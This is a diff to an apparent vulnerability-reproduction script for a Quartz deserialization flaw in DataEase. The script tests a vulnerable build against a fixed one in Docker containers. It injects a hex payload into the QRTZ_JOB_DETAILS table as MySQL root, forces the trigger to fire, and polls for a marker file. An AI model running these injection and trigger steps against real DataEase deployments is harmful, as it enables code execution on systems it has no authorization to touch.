@@ -99,7 +99,7 @@
 
  # Step 4: Verify commons-collections 3.x presence/absence
  echo ""
-@@ -162,25 +210,29 @@
+@@ -162,25 +210,50 @@
  UPDATE dataease.QRTZ_JOB_DETAILS SET JOB_DATA = 0x${HEX} WHERE SCHED_NAME = 'deSyncJob' AND JOB_NAME = 'Datasource' AND JOB_GROUP = 'check_status';
  " 2>&1
 
@@ -120,26 +120,47 @@
 -  docker exec $DATAEASE_V cat /tmp/pruva-cve-2026-40901.txt > "$EVIDENCE/marker-vulnerable.txt" 2>/dev/null || true
 -  VULN_MARKER=1
 -else
-+# Force the Quartz trigger to fire promptly after payload injection instead of waiting
-+# for the scheduler's next several-minute interval.
-+FORCED_FIRE=$(python3 -c "import time; print(int(time.time()*1000) + 5000)")
-+docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "
++force_quartz_fire() {
++  local forced_fire
++  forced_fire=$(python3 -c "import time; print(int(time.time()*1000) + 5000)")
++  docker exec $MYSQL_V mysql -uroot -p'Password123@mysql' -e "
 +UPDATE dataease.QRTZ_TRIGGERS
-+SET NEXT_FIRE_TIME = ${FORCED_FIRE}, TRIGGER_STATE = 'WAITING'
++SET NEXT_FIRE_TIME = ${forced_fire}, TRIGGER_STATE = 'WAITING'
 +WHERE SCHED_NAME='deSyncJob' AND TRIGGER_NAME='Datasource';
 +" 2>&1
++}
 +
-+echo "[+] Forced next trigger fire within ~5s. Waiting up to 90s..."
-+VULN_MARKER=0
-+for i in $(seq 1 18); do
++check_vuln_marker() {
 +  if docker exec $DATAEASE_V test -f /tmp/pruva-cve-2026-40901.txt 2>/dev/null; then
 +    echo "    [VULNERABLE] MARKER FILE FOUND inside running DataEase container!"
 +    docker exec $DATAEASE_V cat /tmp/pruva-cve-2026-40901.txt > "$EVIDENCE/marker-vulnerable.txt" 2>/dev/null || true
 +    VULN_MARKER=1
-+    break
++    return 0
 +  fi
++  return 1
++}
++
++# Force the Quartz trigger to fire promptly after payload injection instead of waiting
++# for the scheduler's next several-minute interval.
++force_quartz_fire
++
++echo "[+] Forced next trigger fire within ~5s. Waiting up to 90s..."
++VULN_MARKER=0
++for i in $(seq 1 18); do
++  check_vuln_marker && break
 +  sleep 5
 +done
++
++if [[ "$VULN_MARKER" != "1" ]]; then
++  echo "[+] Fast trigger did not fire; retrying Quartz wakeups for up to 300s..."
++  for i in $(seq 1 60); do
++    if [ $(( (i - 1) % 6 )) -eq 0 ]; then
++      force_quartz_fire >/dev/null 2>&1 || true
++    fi
++    check_vuln_marker && break
++    sleep 5
++  done
++fi
 +
 +if [[ "$VULN_MARKER" != "1" ]]; then
    echo "    [VULNERABLE] Marker file NOT found"
@@ -147,7 +168,7 @@
  fi
 
  echo "[+] Checking logs for Quartz deserialization evidence..."
-@@ -203,8 +255,8 @@
+@@ -203,8 +276,8 @@
  echo "========== TESTING FIXED v2.10.21 (Container Classpath) =========="
 
  rm -f "$MARKER"
